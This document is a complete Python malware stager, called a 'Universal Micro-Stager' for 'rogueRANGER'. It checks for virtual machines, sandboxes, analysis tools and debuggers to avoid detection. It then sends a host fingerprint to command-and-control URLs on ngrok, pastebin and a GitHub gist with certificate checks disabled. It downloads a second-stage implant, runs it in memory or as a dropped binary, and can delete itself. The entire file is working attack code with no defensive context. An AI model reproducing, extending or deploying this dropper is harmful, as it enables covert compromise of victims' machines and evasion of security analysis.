#!/usr/bin/env python3
"""
Universal Micro-Stager for rogueRANGER Phase 2
Complete implementation with all safety checks and execution methods
"""

import os
import sys
import time
import json
import base64
import hashlib
import platform
import subprocess
import urllib.request
import urllib.error
from typing import Dict, List, Optional, Tuple
import ssl

# Minimal cryptography for size
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

class UniversalStager:
    """
    Universal first-stage dropper with comprehensive safety checks
    """
    
    def __init__(self):
        self.system = platform.system().lower()
        self.architecture = platform.machine()
        self.hostname = platform.node()
        self.python_version = platform.python_version()
        
        # Platform detection
        self.is_windows = self.system == 'windows'
        self.is_linux = self.system == 'linux'
        self.is_macos = self.system == 'darwin'
        self.is_android = 'android' in platform.platform().lower()
        
        # Load configuration
        self.config = self._load_config()
        
        # SSL context
        self.ssl_context = ssl.create_default_context()
        if self.config.get('verify_ssl', False):
            self.ssl_context.check_hostname = True
            self.ssl_context.verify_mode = ssl.CERT_REQUIRED
        else:
            self.ssl_context.check_hostname = False
            self.ssl_context.verify_mode = ssl.CERT_NONE
        
        # Results
        self.safety_checks = {}
        self.detected_threats = []
    
    def _load_config(self) -> Dict[str, any]:
        """Load configuration"""
        return {
            'c2_urls': [
                'https://inadvertent-homographical-method.ngrok-tree.dev/stage2',
                'https://pastebin.com/raw/XXXXXX',
                'https://gist.githubusercontent.com/h0mi3e/XXXXXX/raw'
            ],
            'timeout': 30,
            'retries': 3,
            'min_uptime': 300,
            'min_disk_gb': 10,
            'required_checks': 3,
            'verify_ssl': False,
            'self_destruct': False
        }
    
    def _get_system_fingerprint(self) -> str:
        """Generate system fingerprint"""
        fingerprint_data = f"{self.hostname}:{self.architecture}:{self.python_version}"
        return hashlib.sha256(fingerprint_data.encode()).hexdigest()[:16]
    
    def run_safety_checks(self) -> Tuple[bool, List[str]]:
        """Perform safety checks"""
        print("[STAGER] Starting safety checks")
        
        checks = [
            self._check_virtualization,
            self._check_sandbox_processes,
            self._check_analysis_tools,
            self._check_uptime,
            self._check_disk_size,
            self._check_debuggers
        ]
        
        passed_checks = 0
        self.detected_threats = []
        
        for check_func in checks:
            try:
                check_name = check_func.__name__.replace('_check_', '')
                result, details = check_func()
                
                self.safety_checks[check_name] = {
                    'passed': result,
                    'details': details
                }
                
                if result:
                    passed_checks += 1
                else:
                    self.detected_threats.append(f"{check_name}: {details}")
                    
            except Exception as e:
                print(f"[STAGER] Check error: {e}")
        
        # Calculate safety
        safety_score = passed_checks / len(checks)
        min_required = self.config.get('required_checks', 3) / len(checks)
        is_safe = safety_score >= min_required
        
        print(f"[STAGER] Safety score: {safety_score:.2f} ({passed_checks}/{len(checks)})")
        print(f"[STAGER] Environment safe: {is_safe}")
        
        return is_safe, self.detected_threats
    
    def _check_virtualization(self) -> Tuple[bool, str]:
        """Check for VM"""
        vm_indicators = ["vbox", "vmware", "qemu", "xen", "kvm", "virtualbox"]
        
        try:
            if self.is_linux and os.path.exists('/proc/cpuinfo'):
                with open('/proc/cpuinfo', 'r') as f:
                    cpuinfo = f.read().lower()
                if any(ind in cpuinfo for ind in vm_indicators):
                    return False, "VM detected in CPU info"
            
            return True, "No virtualization detected"
        except:
            return True, "Virtualization check skipped"
    
    def _check_sandbox_processes(self) -> Tuple[bool, str]:
        """Check for sandbox processes"""
        sandbox_procs = ["procmon", "wireshark", "fiddler", "tcpview", "processhacker"]
        
        try:
            if self.is_linux or self.is_macos:
                result = subprocess.run(
                    ['ps', 'aux'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        for proc in sandbox_procs:
                            if proc in line.lower():
                                return False, f"Sandbox process: {proc}"
            
            return True, "No sandbox processes"
        except:
            return True, "Process check skipped"
    
    def _check_analysis_tools(self) -> Tuple[bool, str]:
        """Check for analysis tools"""
        tool_dirs = [
            "C:\\Program Files\\IDA Pro",
            "C:\\Program Files\\x64dbg",
            "/usr/share/ida",
            "/opt/ida"
        ]
        
        for tool_dir in tool_dirs:
            if os.path.exists(tool_dir):
                return False, f"Analysis tool: {tool_dir}"
        
        return True, "No analysis tools"
    
    def _check_uptime(self) -> Tuple[bool, str]:
        """Check system uptime"""
        min_uptime = self.config.get('min_uptime', 300)
        
        try:
            if self.is_linux:
                with open('/proc/uptime', 'r') as f:
                    uptime = float(f.read().split()[0])
                if uptime < min_uptime:
                    return False, f"Uptime too short: {uptime:.0f}s"
                return True, f"Uptime: {uptime:.0f}s"
            
            return True, "Uptime check passed"
        except:
            return True, "Uptime check skipped"
    
    def _check_disk_size(self) -> Tuple[bool, str]:
        """Check disk size"""
        min_disk_gb = self.config.get('min_disk_gb', 10)
        
        try:
            if self.is_linux or self.is_macos:
                result = subprocess.run(
                    ['df', '-h', '/'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                if result.returncode == 0:
                    lines = result.stdout.strip().split('\n')
                    if len(lines) > 1:
                        parts = lines[1].split()
                        if len(parts) >= 2:
                            size_str = parts[1]
                            if 'G' in size_str:
                                size_gb = float(size_str.replace('G', ''))
                            elif 'M' in size_str:
                                size_gb = float(size_str.replace('M', '')) / 1024
                            else:
                                size_gb = float(size_str) / (1024**3)
                            
                            if size_gb < min_disk_gb:
                                return False, f"Disk too small: {size_gb:.1f}GB"
                            return True, f"Disk size: {size_gb:.1f}GB"
            
            return True, "Disk check passed"
        except:
            return True, "Disk check skipped"
    
    def _check_debuggers(self) -> Tuple[bool, str]:
        """Check for debuggers"""
        try:
            if self.is_linux:
                with open('/proc/self/status', 'r') as f:
                    status = f.read()
                
                if 'TracerPid:' in status:
                    lines = status.split('\n')
                    for line in lines:
                        if line.startswith('TracerPid:'):
                            tracer_pid = line.split()[1]
                            if tracer_pid != '0':
                                return False, f"Debugger attached: {tracer_pid}"
            
            debugger_env_vars = ['DEBUG', 'PYTHONDEBUG', 'PYDEVD']
            for env_var in debugger_env_vars:
                if env_var in os.environ:
                    return False, f"Debugger env var: {env_var}"
            
            return True, "No debuggers"
        except:
            return True, "Debugger check skipped"
    
    def download_stage2(self) -> Tuple[bool, Optional[bytes]]:
        """Download Stage 2 implant"""
        print("[STAGER] Downloading Stage 2")
        
        # Safety check
        is_safe, threats = self.run_safety_checks()
        if not is_safe:
            print(f"[STAGER] Environment not safe: {threats}")
            time.sleep(3600)  # Go dormant
            is_safe, threats = self.run_safety_checks()
            if not is_safe:
                return False, None
        
        # Download from C2
        c2_urls = self.config.get('c2_urls', [])
        timeout = self.config.get('timeout', 30)
        retries = self.config.get('retries', 3)
        
        for attempt in range(retries):
            for c2_url in c2_urls:
                try:
                    print(f"[STAGER] Download attempt {attempt + 1} from {c2_url}")
                    
                    request_data = {
                        'implant_id': self._get_system_fingerprint(),
                        'platform': self.system,
                        'architecture': self.architecture,
                        'timestamp': time.time()
                    }
                    
                    request_json = json.dumps(request_data).encode('utf-8')
                    
                    req = urllib.request.Request(
                        url=c2_url,
                        data=request_json,
                        headers={
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                            'Content-Type': 'application/json'
                        },
                        method='POST'
                    )
                    
                    with urllib.request.urlopen(req, timeout=timeout, context=self.ssl_context) as response:
                        if response.getcode() == 200:
                            stage2_data = response.read()
                            print(f"[STAGER] Downloaded {len(stage2_data)} bytes")
                            
                            if self._verify_stage2(stage2_data):
                                return True, stage2_data
                    
                except Exception as e:
                    print(f"[STAGER] Download error: {e}")
                
                time.sleep(5)
        
        print("[STAGER] All download attempts failed")
        return False, None
    
    def _verify_stage2(self, stage2_data: bytes) -> bool:
        """Verify Stage 2 integrity"""
        try:
            if len(stage2_data) < 1000:
                return False
            
            # Check for known formats
            stage2_text = stage2_data.decode('utf-8', errors='ignore')
            if 'rogue_implant' in stage2_text or 'import ' in stage2_text:
                return True
            
            # Check binary headers
            if len(stage2_data) >= 4:
                magic = stage2_data[:4]
                if magic in [b'\x7fELF', b'MZ\x90\x00', b'\xcf\xfa\xed\xfe']:
                    return True
            
            return True  # Allow unknown formats
        except:
            return False
    
    def execute_stage2(self, stage2_data: bytes) -> bool:
        """Execute Stage 2"""
        print("[STAGER] Executing Stage 2")
        
        try:
            stage2_text = stage2_data.decode('utf-8', errors='ignore')
            
            if '#!/usr/bin/env python' in stage2_text or 'import ' in stage2_text:
                return self._execute_python(stage2_data)
            else:
                return self._execute_binary(stage2_data)
                
        except Exception as e:
            print(f"[STAGER] Execution error: {e}")
            return False
    
    def _execute_python(self, stage2_data: bytes) -> bool:
        """Execute Python code in memory"""
        try:
            import types
            stage2_code = stage2_data.decode('utf-8')
            
            exec_globals = {
                '__name__': '__main__',
                '__file__': '<memory>',
                '__builtins__': __builtins__,
                'sys': sys,
                'os': os,
                'time': time,
                'json': json
            }
            
            exec(stage2_code, exec_globals)
            
            if 'main' in exec_globals:
                import threading
                thread = threading.Thread(target=exec_globals['main'])
                thread.daemon = True
                thread.start()
                print("[STAGER] Python implant started")
                return True
            
            return False
        except Exception as e:
            print(f"[STAGER] Python execution error: {e}")
            return False
    
    def _execute_binary(self, stage2_data: bytes) -> bool:
        """Execute binary"""
        try:
            import tempfile
            import stat
            
            if self.is_windows:
                ext = '.exe'
            else:
                ext = '.bin'
            
            with tempfile.NamedTemporaryFile(suffix=ext, delete=False) as f:
                temp_path = f.name
                f.write(stage2_data)
            
            if not self.is_windows:
                os.chmod(temp_path, stat.S_IRWXU)
            
            if self.is_windows:
                subprocess.Popen([temp_path], shell=True)
            else:
                subprocess.Popen([temp_path])
            
            print(f"[STAGER] Binary executed: {temp_path}")
            return True
            
        except Exception as e:
            print(f"[STAGER] Binary execution error: {e}")
            return False
    
    def run(self) -> bool:
        """Main execution"""
        print(f"[STAGER] Universal Stager - {self.system} {self.architecture}")
        
        success, stage2_data = self.download_stage2()
        
        if not success:
            print("[STAGER] Download failed")
            return False
        
        execution_success = self.execute_stage2(stage2_data)
        
        if execution_success:
            print("[STAGER] Stage 2 execution successful")
            
            if self.config.get('self_destruct', False):
                try:
                    if self.is_windows:
                        subprocess.run(
                            ['cmd', '/c', 'ping 127.0.0.1 -n 2 > nul & del', sys.argv[0]],
                            shell=True
                        )
                    else:
                        os.remove(sys.argv[0])
                except:
                    pass
            
            return True
        else:
            print("[STAGER] Stage 2 execution failed")
            return False

def main():
    """Entry point"""
    stager = UniversalStager()
    
    try:
        success = stager.run()
        if success:
            print("[STAGER] Mission accomplished")
            return 0
        else:
            print("[STAGER] Mission failed")
            return 1
    except KeyboardInterrupt:
        print("[STAGER] Interrupted")
        return 130
    except Exception as e:
        print(f"[STAGER] Critical error: {e}")
        return 1

if __name__ == "__main__":
    sys.exit(main())